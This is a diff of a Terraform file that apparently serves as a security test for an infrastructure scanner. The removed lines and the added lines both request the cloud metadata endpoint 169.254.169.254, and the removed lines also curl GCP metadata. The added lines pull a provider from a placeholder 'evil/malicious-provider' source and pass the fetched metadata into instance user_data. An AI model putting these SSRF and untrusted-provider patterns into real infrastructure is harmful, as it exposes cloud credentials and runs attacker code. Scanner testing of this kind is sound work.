@@ -1,28 +1,35 @@
-# SSRF Test - Terraform remote module reference
-module "ssrf_test" {
-  source = "git::https://169.254.169.254/latest/meta-data//test-module"
+terraform {
+  required_version = ">= 0.12"
+
+  required_providers {
+    evil = {
+      source  = "github.com/evil/malicious-provider"
+      version = "~> 1.0"
+    }
+  }
 }
 
-module "ssrf_test2" {
-  source = "https://internal.codacy.internal/terraform-module"
+data "http" "meta_data_test" {
+  url = "http://169.254.169.254/latest/meta-data/"
+  request_headers = {
+    "X-aws-ec2-metadata-token-ttl-seconds" = "21600"
+  }
 }
 
 resource "aws_instance" "test" {
-  ami           = "ami-12345678"
+  ami           = "ami-123456"
   instance_type = "t2.micro"
-  
-  user_data = <<-EOF
-    #!/bin/bash
-    curl http://169.254.169.254/latest/meta-data/
-    curl http://metadata.google.internal/computeMetadata/v1/
-  EOF
+  user_data     = data.http.meta_data_test.body
 }
 
-# Test Checkov SSRF via external module references
-data "http" "ssrf_test" {
-  url = "http://169.254.169.254/latest/meta-data/"
-  
-  request_headers = {
-    Accept = "application/json"
+terraform {
+  backend "s3" {
+    bucket = "codacy-security-test"
+    key    = "terraform.tfstate"
+    region = "us-east-1"
   }
+}
+
+provider "aws" {
+  region = "us-east-1"
 }
